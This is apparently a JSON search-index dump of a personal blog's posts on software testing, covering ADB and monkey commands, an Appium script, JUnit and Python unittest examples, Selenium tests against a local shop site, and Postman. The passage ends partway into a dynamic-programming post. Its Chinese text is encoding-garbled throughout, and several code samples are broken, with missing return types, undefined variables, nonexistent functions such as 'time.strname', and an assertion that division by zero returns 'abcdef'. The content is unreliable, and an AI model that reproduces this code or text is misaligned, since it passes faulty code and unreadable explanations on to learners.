ç¼ºä¸€ä¸å¯ 1615232986341\" style=\"zoom:50%; æ´»åŠ¨ 1615233173816\" style=\"zoom:33%; æœåŠ¡ 1615233382480\" style=\"zoom:50%; å†…å®¹æä¾›è€… 1615233473534\" style=\"zoom: 50%; å¹¿æ’­æ¥å—è€… 1615233720649\" style=\"zoom:50%; Androidæµ‹è¯•ç¯å¢ƒæ­å»º:one:çœŸæœºæµ‹è¯•ä½¿ç”¨çœŸå®çš„æ‰‹æœºæµ‹è¯• :two:å®‰å“æ¨¡æ‹Ÿå™¨:three:Androidè‡ªå¸¦çš„æ¨¡æ‹Ÿå™¨:four:äº‘çœŸæœºæµ‹è¯•Androidå¼€å‘ç¯å¢ƒ å®‰è£…java, jdk ADTå·¥å…·åŒ… ç¯å¢ƒé…ç½®1615309230399\" style=\"zoom: 50%; æ‰“å¼€eclipse 1615310931766\" style=\"zoom:50%; ADBå‘½ä»¤ å¯åŠ¨å’Œå…³é—­æœåŠ¡ adb kill-server adb start server adb.exe connect 127.0.0.1:62001 æŸ¥çœ‹è®¾å¤‡è¿æ¥æƒ…å†µ 1615312862427\" style=\"zoom:50%; å®‰è£…å’Œå¸è½½APKç¨‹åº 1615313005852\" style=\"zoom:50%; 1615313041547\" style=\"zoom:50%; 1615314153934\" style=\"zoom:50%; 1615314260967\" style=\"zoom:50%; 1615314304693\" style=\"zoom:50%; åˆ—å‡ºå½“å‰è®¾å¤‡ä¸Šçš„ç¨‹åºåŒ… adb shell pm list packages ä¸Šä¼ å’Œä¸‹è½½ 1615314565572\" style=\"zoom:50%; æ—¥å¿— 1615396174848\" style=\"zoom:67%; 1615396200109\" style=\"zoom: 50%; è¿‡æ»¤ 1615396559638\" style=\"zoom:50%; å…¶ä»– 1615396733068\" style=\"zoom:50%; adb bugreport monkeyå‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ1615481732999\" style=\"zoom:50%; æ‰€æœ‰çš„æ“ä½œäº‹ä»¶éƒ½æ˜¯éšæœºå‘ç”Ÿçš„ã€‚ä¸ä»¥è®©äººçš„æ„å¿—ä¸ºå˜åŒ–ã€‚ ç”±äºäº‹ä»¶éƒ½æ˜¯éšæœºçš„ã€æ— åºçš„ï¼Œæ‰€ä»¥ä¸åšåŠŸèƒ½æ–¹é¢çš„æµ‹è¯•ï¼Œåªå¯¹APPè¿›è¡Œæ€§èƒ½ã€ç¨³å®šæ€§æ–¹é¢çš„æµ‹è¯•ã€‚ monkeyæµ‹è¯•çš„æ—¶å€™ï¼Œéœ€è¦é•¿æ—¶é—´ã€å¤§é‡çš„æ“ä½œäº‹ä»¶ ç‰¹å¾1615482052583\" style=\"zoom:50%; Monkeyçš„åœæ­¢æ¡ä»¶1615483112988\" style=\"zoom:50%; è¿›å…¥Monkey1615483206902\" style=\"zoom:50%; å‘½ä»¤1615483820132\" style=\"zoom:50%; 1615483835799\" style=\"zoom:50%; 1615484056012\" style=\"zoom:50%; 1615484263141\" style=\"zoom:50%; 1615484482624\" style=\"zoom:50%; 1615484538246\" style=\"zoom:50%; 1615486792982\" style=\"zoom: 67%; 1615486953589 ä½¿ç”¨æ¡ˆä¾‹1615487083624 â€”pct monkeyå‘½ä»¤çš„å‚æ•°,æ²¡æœ‰ç‰¹åˆ«å¼ºåˆ¶æ€§çš„é¡ºåº,å¯ä»¥æŒ‰ç…§monkeyå‘½ä»¤çš„å¸®åŠ©åˆ—è¡¨çš„å‚æ•°é¡ºåºè®°å¿†å’Œä½¿ç”¨. Monkeyå¼‚å¸¸logåˆ†æ1615487991940 1615488289973\" style=\"zoom:50%; 1615488415636\" style=\"zoom:50%; Appium https://github.com/appium/appium-desktop/releases/tag/v1.20.2 1615557202275\" style=\"zoom: 33%; 1615558307389\" style=\"zoom:50%; 1615558370562\" style=\"zoom:50%; 1615558953951\" style=\"zoom:50%; å…ƒç´ è¯†åˆ« ä½¿ç”¨ADTç¯å¢ƒä¸­çš„sdkç›®å½•ä¸‹,toolsç›®å½•ä¸­çš„uiautomatorviewer.bat å¯åŠ¨uiautomatorviewer.bat ç‚¹å‡»device Screenshot 1615560081753 æ“ä½œ1615560132106\" style=\"zoom:50%; æ¨¡æ‹Ÿé”®ç›˜æ‰‹æœºæ“ä½œ è¾“å…¥æ“ä½œ: sendkeys() ç‚¹å‡»æ“ä½œ: click() æ¨¡æ‹Ÿæ‰‹åŠ¿æ“ä½œ 1615563279179\" style=\"zoom:50%; ç§»åŠ¨è®¾å¤‡ç›¸å…³æ“ä½œ1615563684414\" style=\"zoom: 67%; Appiumè„šæœ¬ç¼–å†™public class TestAppium{ public static main(String[] args) throws Exception{ //å®šä¹‰DesiredCapabilitieså¯¹è±¡ DesiredCapabilities dc = new DesiredCapabilities(); //è®¾å®šDesiredCapabilitiesçš„å±æ€§ dc.setCapability(&quot;deviceName&quot;,&quot;127.0.0.1:56001&quot;);//adbå‘½ä»¤æŸ¥å‡ºçš„è®¾å¤‡çš„ç¼–å· dc.setCapability(&quot;automationName&quot;,&quot;Appium&quot;);//è®¾ç½®è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·åç§° dc.setCapability(&quot;platformName&quot;,&quot;Android&quot;);//è®¾ç½®å¹³å°ç³»ç»Ÿåç§° dc.setCapability(&quot;platformVersion&quot;,&quot;4.4.4&quot;);//è®¾ç½®Androidç³»ç»Ÿç‰ˆæœ¬å· dc.setCapability(&quot;appPackage&quot;,&quot;com.youba.calculate&quot;);//è®¾ç½®ç›®æ ‡appåŒ…å dc.setCapability(&quot;appActivity&quot;,&quot;.MainActivity&quot;);//è®¾ç½®ç›®æ ‡appçš„å¯åŠ¨ç•Œé¢ /** * url:æŒ‡çš„æ˜¯æœ¬åœ°appiumæœåŠ¡çš„IPåœ°å€åŠå¯¹åº”çš„ç«¯å£å·(appiumçš„é»˜è®¤ç«¯å£å·æ˜¯4723) * é€šè¿‡è¯¥åœ°å€å¯ä»¥ä½¿appiumè¿æ¥Androidè®¾å¤‡ * * Capabilities:å°±æ˜¯DesiredCapabilitieså¯¹è±¡ **/ //å®šä¹‰appiumé©±åŠ¨å¯¹è±¡ æ‰“å¼€æœ¬åœ°appé©±åŠ¨(appium) AppiumDriver appd = new AppiumDriver(new URL(&quot;http://127.0.0.1/wd/hub&quot;),dc); //å†™è„šæœ¬,è®©è®¡ç®—å™¨è®¡ç®—54+68 appd.findElement(By.id(&quot;com.youba.calculate:id/btn_five&quot;)).click(); appd.findElement(By.id(&quot;com.youba.calculate:id/btn_four&quot;)).click(); appd.findElement(By.id(&quot;com.youba.calculate:id/btn_plus&quot;)).click(); appd.findElement(By.id(&quot;com.youba.calculate:id/btn_six&quot;)).click(); appd.findElement(By.id(&quot;com.youba.calculate:id/btn_eight&quot;)).click(); appd.findElement(By.id(&quot;com.youba.calculate:id/btn_equal&quot;)).click(); appd.closeApp(); } } Junitä¸€æ¬¡å•å…ƒæµ‹è¯•ç”¨ä¾‹è®¾è®¡çš„è¿‡ç¨‹1615652206629 Junitç¯å¢ƒ1615652373832 1615652610537 1615653557718 1615662647821 ç¼–å†™æµ‹è¯•åœ¨è¿™é‡Œä½ å°†ä¼šçœ‹åˆ°ä¸€ä¸ªåº”ç”¨ POJO ç±»ï¼ŒBusiness logic ç±»å’Œåœ¨ test runner ä¸­è¿è¡Œçš„ test ç±»çš„ JUnit æµ‹è¯•çš„ä¾‹å­ã€‚ åœ¨ C:\\ &gt; JUNIT_WORKSPACE è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º EmployeeDetails.java çš„ POJO ç±»ã€‚ public class EmployeeDetails { private String name; private double monthlySalary; private int age; /** * @return the name */ public String getName() { return name; } /** * @param name the name to set */ public void setName(String name) { this.name = name; } /** * @return the monthlySalary */ public double getMonthlySalary() { return monthlySalary; } /** * @param monthlySalary the monthlySalary to set */ public void setMonthlySalary(double monthlySalary) { this.monthlySalary = monthlySalary; } /** * @return the age */ public int getAge() { return age; } /** * @param age the age to set */ public void setAge(int age) { this.age = age; } } EmployeeDetails ç±»è¢«ç”¨äº å–å¾—æˆ–è€…è®¾ç½®é›‡å‘˜çš„å§“åçš„å€¼ å–å¾—æˆ–è€…è®¾ç½®é›‡å‘˜çš„æ¯æœˆè–ªæ°´çš„å€¼ å–å¾—æˆ–è€…è®¾ç½®é›‡å‘˜çš„å¹´é¾„çš„å€¼ åœ¨ C:\\ &gt; JUNIT_WORKSPACE è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º EmpBusinessLogic.java çš„ business logic ç±» public class EmpBusinessLogic { // Calculate the yearly salary of employee public double calculateYearlySalary(EmployeeDetails employeeDetails){ double yearlySalary=0; yearlySalary = employeeDetails.getMonthlySalary() * 12; return yearlySalary; } // Calculate the appraisal amount of employee public double calculateAppraisal(EmployeeDetails employeeDetails){ double appraisal=0; if(employeeDetails.getMonthlySalary() &lt; 10000){ appraisal = 500; }else{ appraisal = 1000; } return appraisal; } } EmpBusinessLogic ç±»è¢«ç”¨æ¥è®¡ç®— é›‡å‘˜æ¯å¹´çš„è–ªæ°´ é›‡å‘˜çš„è¯„ä¼°é‡‘é¢ åœ¨ C:\\ &gt; JUNIT_WORKSPACE è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º TestEmployeeDetails.java çš„å‡†å¤‡è¢«æµ‹è¯•çš„æµ‹è¯•æ¡ˆä¾‹ç±» import org.junit.Test; import static org.junit.Assert.assertEquals; public class TestEmployeeDetails { EmpBusinessLogic empBusinessLogic =new EmpBusinessLogic(); EmployeeDetails employee = new EmployeeDetails(); //test to check appraisal @Test public void testCalculateAppriasal() { employee.setName(&quot;Rajeev&quot;); employee.setAge(25); employee.setMonthlySalary(8000); double appraisal= empBusinessLogic.calculateAppraisal(employee); assertEquals(500, appraisal, 0.0); } // test to check yearly salary @Test public void testCalculateYearlySalary() { employee.setName(&quot;Rajeev&quot;); employee.setAge(25); employee.setMonthlySalary(8000); double salary= empBusinessLogic.calculateYearlySalary(employee); assertEquals(96000, salary, 0.0); } } TestEmployeeDetails æ˜¯ç”¨æ¥æµ‹è¯• EmpBusinessLogic ç±»çš„æ–¹æ³•çš„ï¼Œå®ƒ æµ‹è¯•é›‡å‘˜çš„æ¯å¹´çš„è–ªæ°´ æµ‹è¯•é›‡å‘˜çš„è¯„ä¼°é‡‘é¢ ç°åœ¨è®©æˆ‘ä»¬åœ¨ C:\\ &gt; JUNIT_WORKSPACE è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º TestRunner.java çš„ç±»æ¥æ‰§è¡Œæµ‹è¯•æ¡ˆä¾‹ç±» import org.junit.runner.JUnitCore; import org.junit.runner.Result; import org.junit.runner.notification.Failure; public class TestRunner { public static void main(String[] args) { Result result = JUnitCore.runClasses(TestEmployeeDetails.class); for (Failure failure : result.getFailures()) { System.out.println(failure.toString()); } System.out.println(result.wasSuccessful()); } } ç”¨javacç¼–è¯‘ Test case å’Œ Test Runner ç±» C:\\JUNIT_WORKSPACE&gt;javac EmployeeDetails.java EmpBusinessLogic.java TestEmployeeDetails.java TestRunner.java ç°åœ¨è¿è¡Œå°†ä¼šè¿è¡Œ Test Case ç±»ä¸­å®šä¹‰å’Œæä¾›çš„æµ‹è¯•æ¡ˆä¾‹çš„ Test Runner C:\\JUNIT_WORKSPACE&gt;java TestRunner æ£€æŸ¥è¿è¡Œç»“æœ true","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"interface test","slug":"Interface-test","date":"2021-02-20T09:49:12.000Z","updated":"2021-04-11T17:11:28.165Z","comments":true,"path":"Interface-test/","link":"","permalink":"https://blog.kayleh.top/Interface-test/","excerpt":"","text":"æ¥å£æµ‹è¯• æµ‹è¯•ç³»ç»Ÿå†…éƒ¨å„ä¸ªç»„ä»¶é—´æ¥å£,ä»¥åŠç³»ç»Ÿä¸å¤–éƒ¨ç³»ç»Ÿä¹‹é—´çš„äº¤äº’ç‚¹ 1613845781204\" style=\"zoom:50%; 1613928423300 æ¥å£çš„å¿…è¦æ¡ä»¶1613928573807\" style=\"zoom:50%; æ¥å£ç”¨ä¾‹è®¾è®¡1613929905199\" style=\"zoom:50%; 1613930059453 HTTPåè®®1614016580698\" style=\"zoom: 33%; HTTPå“åº”çŠ¶æ€ç åˆ†ç±»1614100489562\" style=\"zoom:50%; POSTMANå‘é€ä¸å¸¦å‚æ•°çš„GETè¯·æ±‚1614103022980 å‘é€å¸¦å‚æ•°çš„GETè¯·æ±‚1614102472739 1614103130379 å‚æ•°åŒ–è¿è¡Œ1614450840486 1614276217035\" style=\"zoom: 67%; 1614276280706\" style=\"zoom:67%; csvæ–‡ä»¶ 1614276076934\" style=\"zoom: 50%; JSONPostmanä¸­çš„æ–­è¨€1614450747385 1614451204413 1614451174084 1614710982803 1614711029433 1614711672676 450","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"Unitest framework","slug":"Unitest-framework","date":"2021-02-12T08:00:57.000Z","updated":"2021-04-11T17:11:28.470Z","comments":true,"path":"Unitest-framework/","link":"","permalink":"https://blog.kayleh.top/Unitest-framework/","excerpt":"","text":"å¤šæ¡æµ‹è¯•ç”¨ä¾‹ æ³¨è§£æ–¹æ³•1613199579426 äº”ä¸ªæ–¹æ³•1613199693463 æµ‹è¯•ç”¨ä¾‹testcase1613201703588 1613202112317 æµ‹è¯•é›†åˆtestsuiteè¿½åŠ å•ä¸ªæµ‹è¯•å¯¹è±¡1613207825662 print(re.__dict__) è¿½åŠ å¤šä¸ªæµ‹è¯•å¯¹è±¡1613209390861 TestLoder1613231860846 ç¬¬ä¸€ä¸ªå‚æ•°pathï¼šæŒ‡å®šå­˜æ”¾æµ‹è¯•ç”¨ä¾‹çš„ç›®å½•ï¼ˆå•å…ƒæµ‹è¯•ç”¨ä¾‹ï¼Œç”¨unittestæ¡†æ¶å†™çš„æµ‹è¯•ç”¨ä¾‹ï¼‰ ç¬¬äºŒä¸ªå‚æ•°patternï¼šæŒ‡å®šåŒ¹é…è§„åˆ™ 1613233980464 1613234000816 TestRunner1613318481043 1613319975732 çŠ¶æ€11613320910898 çŠ¶æ€2ï¼ˆå¤§äº1å³å¯ï¼‰è¯¦ç»†æŠ¥å‘Š1613320887518 æ–­è¨€1613382483121 class mymath(): def jia(self,a,b): return a+b; def jian(self,a,b): return a-b def changfa(self,a,b): if b==0: return &quot;error&quot; else: return a/b #ä»£ç åŠŸèƒ½éªŒè¯ if __name__==&quot;__main__&quot;: mm = mymath() actualValue = m.jia(2,3) expectValue = 5 if actualValue==expectValue: print(&quot;åŠ æ³•åŠŸèƒ½å®ç°æ­£ç¡®&quot;) try: actualValue==mm.jia(&quot;a&quot;,3) except Exception as e: print(&quot;è¯¥æ–¹æ³•åŠŸèƒ½å®ç°æ­£ç¡®&quot;ï¼Œe) ----------------------------------------------------------- #å¯¼åŒ… import unittest from myMath import mymath #åˆ›å»ºå•å…ƒæµ‹è¯•ç±»(ç»§æ‰¿è‡ªunittest.testcase) class myMathTest(unittest.TestCase): #æµ‹è¯•ç”¨ä¾‹èµ„æºåˆå§‹åŒ–æ–¹æ³• def setUp(self): self.mm = mymath() #æµ‹è¯•ç”¨ä¾‹æ–¹æ³• def test_add_1(self): actualValue = self.mm.jia(2,1) expectValue = 3 #æ–­è¨€ self.assertEqual(actualValue,expectValue,&quot;é¢„æœŸç»“æœä¸ä¸€è‡´&quot;) def test_add_2(self): actualValue = self.mm.jia(&quot;abc&quot;,&quot;def&quot;) expectValue = &quot;abcdef&quot; self.assertEqual(actualValue,expectValue,&quot;é¢„æœŸç»“æœä¸ä¸€è‡´&quot;) def test_floor_1(self): actualValue = self.mm.chufa(4,0) expectValue = &quot;abcdef&quot; self.assertEqual(actualValue,expectValue,&quot;é¢„æœŸç»“æœä¸ä¸€è‡´&quot;) #æµ‹è¯•ç”¨ä¾‹çš„èµ„æºé‡Šæ”¾ def tearDown(self): pass if __name__==&quot;__main__&quot;: #unittest.main() #ç›´æ¥ä½¿ç”¨discover discover=unittest.defaultTestLoader.discover(r&quot;./20200408/&quot;,pattern=&quot;myMathTest.py&quot;) #ä½¿ç”¨runnerè¿è¡Œå™¨è¿è¡Œæµ‹è¯•é›† &quot;a&quot;è¿½åŠ æ¨¡å¼ with open(r&quot;./20200408/re.txt&quot;,&quot;a&quot;,encoding=&quot;utf-8&quot;) as f: runner=unittest.TextTestRunner(f,description=&quot;ç”¨äºæµ‹è¯•mathç±»çš„ç”¨ä¾‹æ‰§è¡Œ&quot;,verbosity=2) runner.run(discover) maintest.py ä¸»æµ‹è¯•æ–‡ä»¶,ä¸æ˜¯ç”¨æ¥å†™æµ‹è¯•ç”¨çš„,è€Œæ˜¯ç”¨æ¥ç»„ç»‡æµ‹è¯•ç”¨æ¥æ‰§è¡Œçš„ 1613396353835 HTMLæµ‹è¯•æ–‡æ¡£HTMLTestRunneræ¨¡å—å®‰è£…HTMLTestRunner.pyåˆ°pythonçš„å®‰è£…ç›®å½•ä¸‹/libä¸­ pip install html-TestRunner ä½¿ç”¨import os from HTMLTestRunner import HTMLTestRunner #path=os.path.dirname(__file__)å½“å‰ç›®å½• path=os.path.dirname(__file__)+r&quot;/&quot; filename=time.strname(&quot;%Y-%m-%d-%H-%M-%S&quot;) + r&quot;.html&quot; filename = path + filename #ä¿®æ”¹ä»£ç  with open(r&quot;./20200408/result.html&quot;,&quot;wb&quot;) as f: runner=unittest.HTMLTestRunner(f,verbosity=2,title=&quot;å•å…ƒæµ‹è¯•æŠ¥å‘Š&quot;,description=&quot;ç¬¬ä¸€æ¬¡è¿è¡Œçš„ç»“æœ&quot;) runner.run(discover) æ³¨é‡Š 1613572049278 1613572027235 é‚®ä»¶è‡ªåŠ¨åŒ–1613574779605 é¡¹ç›®é¡¹ç›®ç›®å½•ç»“æ„ ---public(æ¨¡å—,ä¾‹å¦‚æ³¨å†Œ,ç™»å½•,é€€å‡º) ---test_cases(æµ‹è¯•ç”¨ä¾‹) ---test_datas(æµ‹è¯•æ•°æ®,ä¾‹å¦‚csvæ–‡ä»¶) ---test_report(æµ‹è¯•æŠ¥å‘Š) ç”µå•†ç³»ç»Ÿ/public/loginModule.py ç™»å½•æ¨¡å— from selenium import webdriver from selenium.webdriver.common.action_chains import ActionChains import time class very_login(): def login(self,driver): self.driver=driver self.driver.implicitly_wait(10) self.driver.get(&quot;http://localhost/verydows/&quot;) #ç‚¹å‡»ç™»å½• self.driver.find_element_by_link_text(&quot;ç™»å½•&quot;).click() #è¾“å…¥ç”¨æˆ·åå¯†ç  self.driver.find_element_by_xpath(&#39;//*[@id=&quot;username&quot;]&#39;).send_keys(&quot;kayleh&quot;) self.driver.find_element_by_xpath(&#39;//*[@id=&quot;password&quot;]&#39;).send_keys(&quot;123456&quot;) #ç‚¹å‡»ç™»å½•æŒ‰é’® self.driver.find_element_by_xpath(&#39;//*[@id=&quot;login-form&quot;]/div/a&#39;).click() time.sleep(5) #é€€å‡ºç™»å½• def logout(self,driver): self.driver=driver ele=self.driver.find_element_by_xpath(&#39;//*[@id=&quot;top-userbar&quot;]/a&#39;) ActionChains(self.driver).move_to_element(ele).perform() self.driver.find_element_by_link_text(&quot;é€€å‡º&quot;).click() #é€€å‡ºæµè§ˆå™¨å¯¹è±¡ def quitB(self,driver): self.driver=driver self.driver.quit() if __name__==&quot;__main__&quot;: driver=webdriver.Chrome() ç”µå•†ç³»ç»Ÿ/testcases/verydows_user_update.py æ›´æ–°ç”¨æˆ·ä¿¡æ¯ import unittest from selenium import webdriver import time import os import sys #os.path.dirname(os.path.dirname(__file__))æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•(ç”µå•†ç³»ç»Ÿ) path=os.path.dirname(os.path.dirname(__file__))+r&quot;/public&quot; #æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ path1=sys.path path1.append(path) from loginModule import very_login class verydows_user_update(unittest.TestCase): def setUp(self): self.ll = very_login() self.driver=webdriver.Chrome() self.ll.login(self.driver) def test_user_01(self): time.sleep(3) self.driver.find_element_by_xpath(&#39;&#39;).click() time.sleep(2) self.driver.find_element_by_xpath(&#39;&#39;).clear() time.sleep(2) self.driver.find_element_by_xpath(&#39;&#39;).send_keys(&quot;petter&quot;) time.sleep(2) self.driver.find_element_by_xpath(&#39;&#39;).clear() time.sleep(5) #ä¿®æ”¹å®ŒéªŒè¯ def tearDown(self): self.ll.logout(self.driver) self.ll.quitB(self.driver) actualValue=self.driver.find_element_by_xpath(&#39;&#39;).get_attribute(&quot;value&quot;) expectValue=&quot;peter&quot; self.assertEqual(actualValue,expectValue) if __name__==&quot;__main__&quot;: unittest.main() ç”µå•†ç³»ç»Ÿ/testcases/verydows_reg_true.py import unittest from selenium import webdriver import time import csv import os filename = os.path.dirname(os.path.dirname(__file__))+r&quot;/test_datas/data_csv.csv&quot; class verydows_reg_true(unittest.TestCase): def setUp(self): pass def test_reg_01(self): with open(filename,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f: data=csv.reader(f) for d in data: driver.get(&quot;http://localhost/verydows/&quot;) driver.find_element_by_link_text(&quot;å…è´¹æ³¨å†Œ&quot;).click() driver.find_element_by_id(&quot;username&quot;).send_keys(d[0]) driver.find_element_by_id(&quot;email&quot;).send_keys(d[1]) driver.find_element_by_id(&quot;password&quot;).send_keys(d[2]) driver.find_element_by_id(&quot;repassword&quot;).send_keys(d[3]) driver.find_element_by_link_text(&quot;ç«‹å³æ³¨å†Œ&quot;).click() #å› ä¸ºæœ‰ä¸€ä¸ªä¸­é—´é¡µé¢çš„è·³è½¬ï¼Œæ­¤å¤„è¦å¼ºåˆ¶ç­‰å¾…ä¸€ä¸‹ï¼Œè®©ä»–è·³è½¬è¿‡å» time.sleep(2) #æ–­è¨€ #expectUrl=&quot;http://localhost/verydows/index.php?c=user&amp;a=index&quot; #actualUrl=driver.current_url expectValue=d[4] actualValue=driver.find_element_by_xpath(&#39;//....&#39;).text() #if expectValue==actualValue: # print(&quot;æ³¨å†Œusernameåå‘æµ‹è¯•ç”¨ä¾‹é€šè¿‡&quot;) #else: # print(&quot;æ³¨å†Œusernameåå‘ç”¨ä¾‹ä¸é€šè¿‡&quot;) self.assertEqual(expectValue,actualValue) #å…³é—­æµè§ˆå™¨å¯¹è±¡ driver.quit() def tearDown(self): pass if __name__==&quot;__main__&quot;: unittest.main() ç”µå•†ç³»ç»Ÿ/maintest.py #åœ¨æ­¤æ–‡ä»¶ä¸­è°ƒåº¦æµ‹è¯•ç”¨ä¾‹æ‰§è¡Œ import unittest from HTMLTestRunner import HTMLTestRunner import os import time pathCase=os.path.dirname(__file__)+r&quot;/test_cases/&quot; pathReport=os.path.dirname(__file__)+r&quot;/test_cases/&quot; filename=time.strname(&quot;%Y-%m-%d-%H-%M-%S&quot;) + r&quot;.html&quot; filename=pathReport+filename discover = unittest.defaultTestLoader.discover(path,pattern=r&quot;verydows*.py&quot;) with open(filename,&quot;wb&quot;) as f: runner=unittest.HTMLTestRunner(f,verbosity=2,title=&quot;è‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹æŠ¥å‘Š&quot;,description=&quot;XX&quot;) runner.run(discover) Unittestä¸‹çš„æ•°æ®é©±åŠ¨æµ‹è¯•æ•°æ®å­˜å‚¨ æµ‹è¯•è„šæœ¬ä¸æµ‹è¯•æ•°æ®åˆ†ç¦» 1613756103321 ä¸å¯¼å…¥ddtæ¨¡å—ï¼Œå­—å…¸åªä¼šå½¢æˆä¸€æ¡æµ‹è¯•ç”¨ä¾‹ 1613756685341 excel1613756844713 1613756873832 xldr 1613757056609 excelutil.py 1613757120441\" style=\"zoom:67%; 1613757139743\" style=\"zoom:80%; 1613757341191","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"Katalon Recorder (Selenium tests generator)","slug":"katalon","date":"2021-02-01T10:42:57.000Z","updated":"2021-04-11T17:11:28.506Z","comments":true,"path":"katalon/","link":"","permalink":"https://blog.kayleh.top/katalon/","excerpt":"","text":"å’ŒSelenium IDEç±»ä¼¼çš„å·¥å…· Katalon Recorder (Selenium tests generator)","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"Dynamic programmingåŠ¨æ€è§„åˆ’","slug":"åŠ¨æ€è§„åˆ’","date":"2021-01-31T10:54:04.000Z","updated":"2021-04-11T17:11:28.769Z","comments":true,"path":"åŠ¨æ€è§„åˆ’/","link":"","permalink":"https://blog.kayleh.top/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","excerpt":"","text":"åŠ¨æ€è§„åˆ’ é¦–å…ˆï¼ŒåŠ¨æ€è§„åˆ’é—®é¢˜çš„ä¸€èˆ¬å½¢å¼å°±æ˜¯æ±‚æœ€å€¼ã€‚åŠ¨æ€è§„åˆ’å…¶å®æ˜¯è¿ç­¹å­¦çš„ä¸€ç§æœ€ä¼˜åŒ–æ–¹æ³•ï¼Œåªä¸è¿‡åœ¨è®¡ç®—æœºé—®é¢˜ä¸Šåº”ç”¨æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚è¯´è®©ä½ æ±‚æœ€é•¿é€’å¢å­åºåˆ—å‘€ï¼Œæœ€å°ç¼–è¾‘è·ç¦»å‘€ç­‰ç­‰ã€‚ æ—¢ç„¶æ˜¯è¦æ±‚æœ€å€¼ï¼Œæ ¸å¿ƒé—®é¢˜æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ±‚è§£åŠ¨æ€è§„åˆ’çš„æ ¸å¿ƒé—®é¢˜æ˜¯ç©·ä¸¾ã€‚å› ä¸ºè¦æ±‚æœ€å€¼ï¼Œè‚¯å®šè¦æŠŠæ‰€æœ‰å¯è¡Œçš„ç­”æ¡ˆç©·ä¸¾å‡ºæ¥ï¼Œç„¶ååœ¨å…¶ä¸­æ‰¾æœ€å€¼å‘—ã€‚ åŠ¨æ€è§„åˆ’è¿™ä¹ˆç®€å•ï¼Œå°±æ˜¯ç©·ä¸¾å°±å®Œäº‹äº†ï¼Ÿæˆ‘çœ‹åˆ°çš„åŠ¨æ€è§„åˆ’é—®é¢˜éƒ½å¾ˆéš¾å•Šï¼ é¦–å…ˆï¼ŒåŠ¨æ€è§„åˆ’çš„ç©·ä¸¾æœ‰ç‚¹ç‰¹åˆ«ï¼Œå› ä¸ºè¿™ç±»é—®é¢˜å­˜åœ¨ã€Œé‡å å­é—®é¢˜ã€ï¼Œå¦‚æœæš´åŠ›ç©·ä¸¾çš„è¯æ•ˆç‡ä¼šæå…¶ä½ä¸‹ï¼Œæ‰€ä»¥éœ€è¦ã€Œå¤‡å¿˜å½•ã€æˆ–è€…ã€ŒDP tableã€æ¥ä¼˜åŒ–ç©·ä¸¾è¿‡ç¨‹ï¼Œé¿å…ä¸å¿…è¦çš„è®¡ç®—ã€‚ è€Œä¸”ï¼ŒåŠ¨æ€è§„åˆ’é—®é¢˜ä¸€å®šä¼šå…·å¤‡ã€Œæœ€ä¼˜å­ç»“æ„ã€ï¼Œæ‰èƒ½é€šè¿‡å­é—®é¢˜çš„æœ€å€¼å¾—åˆ°åŸé—®é¢˜çš„æœ€å€¼ã€‚ å¦å¤–ï¼Œè™½ç„¶åŠ¨æ€è§„åˆ’çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯ç©·ä¸¾æ±‚æœ€å€¼ï¼Œä½†æ˜¯é—®é¢˜å¯ä»¥åƒå˜ä¸‡åŒ–ï¼Œç©·ä¸¾æ‰€æœ‰å¯è¡Œè§£å…¶å®å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œåªæœ‰åˆ—å‡ºæ­£ç¡®çš„ã€ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€æ‰èƒ½æ­£ç¡®åœ°ç©·ä¸¾ã€‚ ä»¥ä¸Šæåˆ°çš„é‡å å­é—®é¢˜ã€æœ€ä¼˜å­ç»“æ„ã€çŠ¶æ€è½¬ç§»æ–¹ç¨‹å°±æ˜¯åŠ¨æ€è§„åˆ’ä¸‰è¦ç´ ã€‚å…·ä½“ä»€ä¹ˆæ„æ€ç­‰ä¼šä¼šä¸¾ä¾‹è¯¦è§£ï¼Œä½†æ˜¯åœ¨å®é™…çš„ç®—æ³•é—®é¢˜ä¸­ï¼Œå†™å‡ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹æ˜¯æœ€å›°éš¾çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆå¾ˆå¤šæœ‹å‹è§‰å¾—åŠ¨æ€è§„åˆ’é—®é¢˜å›°éš¾çš„åŸå› ï¼Œæˆ‘æ¥æä¾›æˆ‘ç ”ç©¶å‡ºæ¥çš„ä¸€ä¸ªæ€ç»´æ¡†æ¶ï¼Œè¾…åŠ©ä½ æ€è€ƒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š æ˜ç¡® base case -&gt; æ˜ç¡®ã€ŒçŠ¶æ€ã€-&gt; æ˜ç¡®ã€Œé€‰æ‹©ã€ -&gt; å®šä¹‰ dp æ•°ç»„/å‡½æ•°çš„å«ä¹‰ã€‚ æŒ‰ä¸Šé¢çš„å¥—è·¯èµ°ï¼Œæœ€åçš„ç»“æœå°±å¯ä»¥å¥—è¿™ä¸ªæ¡†æ¶ï¼š # åˆå§‹åŒ– base case dp[0][0][...] = base # è¿›è¡ŒçŠ¶æ€è½¬ç§» for çŠ¶æ€1 in çŠ¶æ€1çš„æ‰€æœ‰å–å€¼ï¼š for çŠ¶æ€2 in 